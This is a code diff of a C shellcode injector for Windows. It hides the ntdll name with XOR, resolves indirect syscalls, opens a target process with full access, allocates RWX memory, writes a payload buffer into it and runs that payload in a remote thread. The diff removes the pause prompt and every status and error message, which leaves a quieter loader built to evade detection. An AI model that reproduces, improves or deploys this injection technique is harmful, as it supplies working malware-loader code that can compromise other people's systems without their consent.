@@ -67,9 +67,6 @@ int main(int argc, char* argv[]) {
 
     DecryptXOR(NDLCRY, strlen(NDLCRY), key, strlen(key));
 
-    printf("press enter to start");
-    getchar();
-
     LPCWSTR NDLNOCRY = ConvertToLPCWSTR(NDLCRY);
     hNTDLL = GetModuleHandleW(NDLNOCRY);
 
@@ -79,52 +76,35 @@ int main(int argc, char* argv[]) {
     IndirectPrelude(hNTDLL, "NtQueryTimer", &NtQueryTimerSyscall);
     IndirectPrelude(hNTDLL, "NtCancelTimer", &NtCancelTimerSyscall);
 
-    okay("indirect prelude finished! beginning injection");
-    info("getting a handle on the process (%ld)...", PID);
-
     STATUS = OP(&pH, PROCESS_ALL_ACCESS, &OA, &CID);
     if (!STATUS == STATUS_SUCCESS) {
-        warn("[OP] failed to get a handle on the process (%ld), error: 0x%x", PID, STATUS);
         return EXIT_FAILURE;
     }
-    okay("got a handle to the process!");
-    info("\\___[ hProcess\n\t\\_0x%p]\n", pH);
-
-    info("allocating buffer in process memory...");
 
     STATUS = AVM(pH, &bA, 0, &rS, MEM_COMMIT | MEM_RESERVE, 0x40);
     if (!STATUS == STATUS_SUCCESS) {
-        warn("[AVM] failed to allocate memory, error: 0x%x", STATUS);
         return EXIT_FAILURE;
     }
-    okay("allocated buffer with PAGE_EXECUTE_READWRITE [RWX] permissions!");
-
+    
     STATUS = WVM(pH, bA, oppenhiemer, sizeof(oppenhiemer), NULL);
     if (!STATUS == STATUS_SUCCESS) {
-        warn("[WVM] failed to write to allocated buffer, error: 0x%x", STATUS);
         return EXIT_FAILURE;
     }
 
     STATUS = CT(&nT, THREAD_ALL_ACCESS, NULL, pH, bA, NULL, FALSE, 0, 0, 0, NULL);
     if (!STATUS == STATUS_SUCCESS) {
-        warn("[CT] failed to create thread, error: 0x%x", STATUS);
         return EXIT_FAILURE;
     }
-    okay("thread created!");
 
     STATUS = WFSO(nT, FALSE, NULL);
     if (!STATUS == STATUS_SUCCESS) {
-        warn("[WFSO] failed to wait for object (hThread), error: 0x%x", STATUS);
         return EXIT_FAILURE;
     }
-    okay("thread finished execution!");
 
     if (nT) {
-        printf("closing handle to thread\n");
         C(nT);
     }
     if (pH) {
-        printf("closing handle to process\n");
         C(pH);
     }
  }
